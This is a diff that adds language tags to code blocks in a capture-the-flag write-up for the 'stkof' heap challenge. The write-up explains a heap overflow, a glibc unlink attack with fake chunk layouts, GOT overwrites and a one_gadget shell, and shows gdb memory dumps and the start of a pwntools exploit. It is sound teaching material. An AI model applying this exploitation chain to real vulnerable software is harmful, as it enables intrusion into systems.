@@ -2,7 +2,7 @@
 
 Let's take a look at the binary, and the libc:
 
-```
+```console
 $    file stkof
 stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
 $    pwn checksec stkof
@@ -43,7 +43,7 @@ So we can see that we are dealing with a `64` bit binary, with a Stack Canary an
 
 When we take a look at the binary in Ghidra, we find a function at `0x00400c58` that appears to be the menu function:
 
-```
+```c
 
 undefined8 main(void)
 
@@ -103,7 +103,7 @@ LAB_00400ce3:
 
 So we can see, we have four different menu options. `1` for allocating chunks, `2` for scanning data, `3` for free a chunk, and `4` for printing data. Also there is a system where the functions will report back if they were successful, and that is what triggers either the `OK` or `FAIL`. Let's take a look at `allocateChunk`:
 
-```
+```c
 undefined8 allocateChunk(void)
 
 {
@@ -137,7 +137,7 @@ undefined8 allocateChunk(void)
 
 So we can see here, it prompts us for a size then mallocs that many bytes. There is no check on the size we pass it (only a check to ensure that malloc didn't return a null pointer). After that it will increment the bss integer `ptrCount` at `0x602100`, and store the pointer in `ptrArray` at `0x602140` (also it is one indexed so the pointers start at `0x602148`). Next up we have the `scanData` function:
 
-```
+```c
 undefined8 scanData(void)
 
 {
@@ -191,7 +191,7 @@ undefined8 scanData(void)
 
 Here we can see that it prompts us an index to `ptrArray` for where to scan in data. Then it prompts us for the amount of bytes to scan in. Notice that it doesn't check the size we pass it, so we have a heap overflow bug here. Next up we have `freeFunction`:
 
-```
+```c
 
 undefined8 freeFunction(void)
 
@@ -229,7 +229,7 @@ undefined8 freeFunction(void)
 
 Here we can see, it prompts us for an index to free. If it passes the check, it will free the pointer, and clear it out (so no use after free). Next up we have `printData`:
 
-```
+```c
 undefined8 printData(void)
 
 {
@@ -279,7 +279,7 @@ Our exploitation process will contain two parts. The first will be doing an Unli
 
 So for our exploitation process, we will be doing an unlink attack (which is viable on older libc versions, think pre-tcache). Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons). What this attack will do is give us a write. However there are a lot of restrictions on what we can write and where we can write. Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out. This is the write that we get. Let's take a look at the code in `malloc.c` to get a bit of an idea:
 
-```
+```c
 /* Take a chunk off a bin list.  */
 static void
 unlink_chunk (mstate av, mchunkptr p)
@@ -299,7 +299,7 @@ So we can see here, what it does is it takes a chunk, and performs some checks o
 
 So here is a bit of a representation of what's happening. Starting off here are our three chunks that will be a part of the unlink. They are linked via a doubly linked list with `fd` (forward) and `bk` (back) pointers. The only chunk we are actually going to write any data for will be the middle chunk. For this we will allocate two chunks (actual chunks allocated with malloc). These two chunks will need to be stored adjacent in memory (so we can use one to overflow the other). In the first one we will store the fake chunk, and also use it to overflow into the metadata of the second chunk. Then by freeing the second chunk it will trigger the unlink. The second chunk will not store any part of these three chunks.:
 
-```
+```text
 +----------------+    +----------------+    +----------------+
 | BK             |    | P (fake chunk) |    | FD             |
 +----------------+    +----------------+    +----------------+
@@ -311,7 +311,7 @@ So here is a bit of a representation of what's happening. Starting off here are 
 
 So in order to pass the unlink check for `if (__builtin_expect (fd->bk != p || bk->fd != p, 0))`, the back pointer of the next chunk and the forward pointer of the previous chunk must be equal to the chunk address of our fake chunk. This is why we need a pointer to our heap chunk to be stored in an area of memory that we know and can read from. Since we have that in the PIE, this is fairly easy to set up. We just need to take the address that the pointer to our fake chunk is stored at, and subtract `0x18` from it to setup the `P->FD` pointer. The first `0x10` bytes of the `0x18` is because there are two QWORDS taken up for the heap metadata (like with a lot of heap chunks). The last `0x8` bytes is because with the `FD` chunk, we are worried about the `FD->bk` pointer not the `FD->fd` and the `FD->fd` takes up the first eight bytes of the chunk (so we need to shift it back by eight bytes to get the pointer in the right spot). Coincidentally we need to subtract `0x10` bytes from the pointer to our fake heap chunk for our `P->bk`, since with that chunk we are worried about the `fwd` pointer which is before the back pointer. The values for `FD-fd ` and `BK->bk ` don't matter too much in this case:
 
-```
+```text
 +----------------+    +----------------+    +----------------+
 | BK             |    | P (fake chunk) |    | FD             |
 +----------------+    +----------------+    +----------------+
@@ -323,7 +323,7 @@ So in order to pass the unlink check for `if (__builtin_expect (fd->bk != p || b
 
 There are two more checks we need to worry about. The first is the size check of our fake chunk, which we will cover in a bit when we talk about how exactly we are going to overflow the heap metadata. The third check consists of the `p->fd_nextsize != NULL`. If we can set `p->fd_nextsize` equal to null, that means we will be able to skip most other checks which will save us a lot of time and hassle. Looking at the source code in `malloc.c` (https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#_int_free) we can see it is stored right after the `bk` pointer:
 
-```
+```text
 struct malloc_chunk {
   INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
   INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
@@ -339,7 +339,7 @@ So in order to hit that check that way we want, we just need to set the next QWO
 
 After that, we will free the second chunk (second chunk that we allocated) which will trigger the unlink, and write a pointer to `BK-fd` and `FD->bk`. In this case it will be a pointer to the fake `FD` chunk, since they will both be writing it to the same location in memory, however that pointer gets written last.
 
-```
+```text
 +----------------+    +----------------+
 | BK             |    | FD             |
 +----------------+    +----------------+
@@ -351,7 +351,7 @@ After that, we will free the second chunk (second chunk that we allocated) which
 
 Let's talk about how we will be overflowing the heap metadata and constructing the fake chunk. When I was just trying different things with the code, I noticed that when I was allocating `0xa0` byte chunks, the `4th` and `5th` chunks would be adjacent, so they would be good for the overflow:
 
-```
+```gdb
 gef➤  x/30g 0x14fc630
 0x14fc630:  0x0 0xb1
 0x14fc640:  0x0 0x0
@@ -372,7 +372,7 @@ gef➤  x/30g 0x14fc630
 
 Here we can see two chunks of size `0xb1` (`0xa0` chunks with `0x10` bytes worth of metadata and `0x1` previous chunk in use bit set). We will store our fake chunk at `0x14fc640` and will contain the following values:
 
-```
+```text
 0x14fc640:  Previous Size   0x0
 0x14fc648:  Size            0xa0
 0x14fc650:  fd pointer      (0x602160 - (8*3))
@@ -382,14 +382,14 @@ Here we can see two chunks of size `0xb1` (`0xa0` chunks with `0x10` bytes worth
 
 In addition to that we will overflow the heap metadata of the next chunk (`0x14fc6f0`) with the following values:
 
-```
+```text
 0x14fc6d0:  Previous Size   0xa0
 0x14fc6d8:  Size            0xb0
 ```
 
 So the reason why we set the Size to `0xb0` is to clear out the previous in use bit, so malloc will think that the previous chunk has been freed (requirement for unlink). We placed a fake previous size value of `0xa0` because `0x14fc6e0 - 0xa0 = 0x14fc640` which is the start of our fake chunk. That way the previous size will point right to the start of our fake chunk (another requirement for the unlink). The reason why the `Size` for our fake chunk is set to `0xa0` is because of the `(chunksize (p) != prev_size (next_chunk (p)))` from malloc.c where it checks if the previous size of the chunk that is getting freed is the same as the chunk size of the chunk getting unlinked. I covered earlier why the values for `fd`, `bk` and `fd next size` were the values they are. After we create the fake chunk and execute the overflow, this is what the memory looks like:
 
-```
+```gdb
 gef➤  x/30g 0x14fc630
 0x14fc630:  0x0 0xb1
 0x14fc640:  0x0 0xa0
@@ -422,7 +422,7 @@ gef➤  x/10g 0x602140
 
 So we can see our fake chunk and heap metadata overflow just like we planned. This should write the pointer `0x602148` to `0x602160` since `0x602148` is the `fd` pointer and `bk->fd = fd` happens in malloc.c. After the unlink, we can see that the write worked:
 
-```
+```gdb
 gef➤  x/10g 0x602140
 0x602140: 0x0 0x14fc020
 0x602150: 0x14fc4e0 0x14fc590
@@ -457,7 +457,7 @@ So now that we have a pointer to the array of pointers that we can write to, the
 
 First we start off with the memory post unlink attack:
 
-```
+```gdb
 gef➤  x/10g 0x602140
 0x602140: 0x0 0x24fc020
 0x602150: 0x24fc4e0 0x24fc590
@@ -468,7 +468,7 @@ gef➤  x/10g 0x602140
 
 We will use the `0x602148` to write the got entry addresses for `strlen` and `malloc`:
 
-```
+```gdb
 gef➤  x/10g 0x602140
 0x602140: 0x0 0x602030
 0x602150: 0x602070  0x24fc590
@@ -483,7 +483,7 @@ gef➤  x/g 0x602070
 
 Next we will write the plt address of `puts` to the got entry for `strlen` and get the infoleak:
 
-```
+```gdb
 gef➤  x/10g 0x602140
 0x602140: 0x0 0x602030
 0x602150: 0x602070  0x24fc590
@@ -498,7 +498,7 @@ gef➤  x/i 0x400760
 
 Finally we will just overwrite the got entry for `malloc` with a oneshot gadget, and then just call malloc to get a shell:
 
-```
+```gdb
 gef➤  x/10g 0x602140
 0x602140: 0x0000000000000000  0x0000000000602030
 0x602150: 0x0000000000602070  0x00000000024fc590
@@ -511,7 +511,7 @@ gef➤  x/i 0x00007f42c1a452a4
 ```
 
 Also remember to get our oneshot gadget:
-```
+```console
 $ one_gadget libc-2.23.so 
 0x45216 execve("/bin/sh", rsp+0x30, environ)
 constraints:
@@ -534,7 +534,7 @@ constraints:
 
 Putting it all together we get the following exploit (this exploit was ran on `Ubuntu 16.04`):
 
-```
+```python
 from pwn import *
 
 target = process("./stkof", env={"LD_PRELOAD":"./libc-2.23.so"})
@@ -631,7 +631,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $ python exploit.py
 [+] Starting local process './stkof': pid 28678
 [*] '/home/guyinatuxedo/Desktop/hitcon14/stkof'
